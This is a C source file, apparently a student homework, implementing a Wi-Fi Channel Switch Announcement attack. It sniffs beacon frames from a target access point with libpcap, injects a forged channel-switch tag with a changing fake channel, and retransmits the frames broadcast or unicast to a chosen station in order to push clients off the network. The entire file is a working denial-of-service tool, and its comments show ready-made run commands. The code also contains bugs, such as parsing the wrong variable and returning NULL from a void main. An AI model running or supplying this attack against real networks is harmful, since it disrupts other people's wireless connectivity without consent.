#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <stdio.h>
#include <time.h>
#include <arpa/inet.h> // for htons and htonl
#include <sys/types.h>
#include "main.h"
// make && "/home/kali/GIT/homework_CSA_attack/"csa-attack mon0 46:ea:30:f4:5f:1d
// make && "/home/kali/GIT/homework_CSA_attack/"csa-attack mon0 46:ea:30:f4:5f:1d 48:bc:e1:8d:5a:2e
int UNICAST_FLAG = 0;

void parse_mac_address(const char *str, uint8_t *mac)
{
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

// NamJung origin Code
// 'return 0' is True
// 'others' are False
int compareMacAddr(uint8_t MAC1[MAC_ADDR_LEN], uint8_t MAC2[MAC_ADDR_LEN])
{
    int i;
    for (i = MAC_ADDR_LEN - 1; i > 0 && MAC1[i] - MAC2[i] == 0;)
        i--;
    return i;
}

// tagN 다음 tag의 시작 위치를 반환
unsigned char *findInsertionPoint(unsigned char *tags, int tagN)
{
    while (tags[0] < tagN)
    {
        tags += tags[1] + 2;
    }
    return tags;
}

void main(int argc, char *argv[])
{
    const char *interface = argv[1];
    const char *apMac_char = argv[2];
    uint8_t stationMac[MAC_ADDR_LEN];
    uint8_t apMac[MAC_ADDR_LEN];
    char *station_mac_char;
    if (argc > 3)
    {
        UNICAST_FLAG = 1;
        station_mac_char = argv[3];
        parse_mac_address(stationMac, stationMac);
    }
    parse_mac_address(apMac_char, apMac);

    if (UNICAST_FLAG == 1)
    {
        station_mac_char = argv[3];
        parse_mac_address(station_mac_char, stationMac);
    }

    // pcap library 이용 패킷 잡기
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr *header;
    const u_char *packet;
    // struct ieee80211_radiotap_header* radiotap_header;

    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
        return;
    }
    int fakeChannel = 1;

    // 패킷을 잡아서 분석하는 부분
    while (1)
    {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == -1 || res == -2)
            break;

        struct radiotap_header *radioHdr = (struct radiotap_header *)packet; // 구조체 포인터 변수 + 1 = 의 결과는 구조체 크기만큼 바이트 수가 증가한다.
        struct BeaconFrmae *frame = (struct BeaconFrame *)((uint8_t *)radioHdr + radioHdr->it_len);
        struct BeaconBody *body = (struct BeaconBody *)((uint8_t *)frame + sizeof(struct BeaconFrmae));

        uint8_t BroadCast_MAC[MAC_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        // === filter code Start ===
        if (compareMacAddr(BroadCast_MAC, frame->DestinationAddr) != 0) // not Equal
            continue;
        if (compareMacAddr(apMac, frame->SourceAddr) != 0) // not Equal
            continue;
        if (htons(frame->frameControlField) != 0x8000)
            continue;
        // === filter code End ===

        // ===  copy packet(stack) -> (heap) ====
        int SIZE_FAKE_FRAME = 5;
        int heap_pkt_size = header->len + SIZE_FAKE_FRAME;
        unsigned char *heap_packet = (unsigned char *)malloc(heap_pkt_size);
        if (heap_packet == NULL)
        {
            perror("Failed to allocate memory");
            return NULL;
        }
        memcpy(heap_packet, packet, header->len);
        struct radiotap_header *heap_radioHdr = (struct radiotap_header *)heap_packet; // 구조체 포인터 변수 + 1 = 의 결과는 구조체 크기만큼 바이트 수가 증가한다.
        struct BeaconFrmae *heap_frame = (struct BeaconFrame *)((uint8_t *)heap_radioHdr + heap_radioHdr->it_len);
        struct BeaconBody *heap_body = (struct BeaconBody *)((uint8_t *)heap_frame + sizeof(struct BeaconFrmae));
        // ===  copy packet(stack) -> (heap) End ====

        // 37번 Tag 다음의 Tag pointer 위치를 찾음.
        u_char *heap_nextTag = findInsertionPoint(heap_body->tag_value, 37);
        fakeChannel = ((fakeChannel + 1) % 10) + 1;
        u_char channelSwitchTag[5] = {0x25, 0x03, fakeChannel, 0x0d, 0x03};

        // inesrt fakeChannelSwitchAnnouncement
        // printf("size : %d  " , heap_packet + heap_pkt_size - heap_nextTag);
        for (int i = 0; i < heap_packet + heap_pkt_size - heap_nextTag; i++)
            heap_packet[heap_pkt_size - i] = heap_packet[heap_pkt_size - SIZE_FAKE_FRAME - i];
        for (int i = 0; i < SIZE_FAKE_FRAME; i++)
            heap_nextTag[i] = channelSwitchTag[i];

        // === send Unicast ===
        if(UNICAST_FLAG == 1){
            for(int i=0; i<MAC_ADDR_LEN; i++){
                heap_frame->DestinationAddr[i] = stationMac[i];
            }
        }
        // === send Unicast end ===

        if (pcap_sendpacket(handle, heap_packet, heap_pkt_size) != 0)
        {
            printf("\nError Sending the paccking : %s ", pcap_geterr(handle));
        }

        

        // === debug code Start ===
        printf("type : 0x%4X\n", htons(frame->frameControlField));
        printf("Dst : ");
        for (int i = 0; i < MAC_ADDR_LEN; i++)
        {
            printf("%02X:", frame->DestinationAddr[i]);
        }
        printf(", Src : ");
        for (int i = 0; i < MAC_ADDR_LEN; i++)
        {
            printf("%02X:", frame->SourceAddr[i]);
        }
        printf(", changed Channel : %d", fakeChannel);
        // === debug code End ===
        
        printf("\n");
        free(heap_packet);
    }

    pcap_close(handle);
}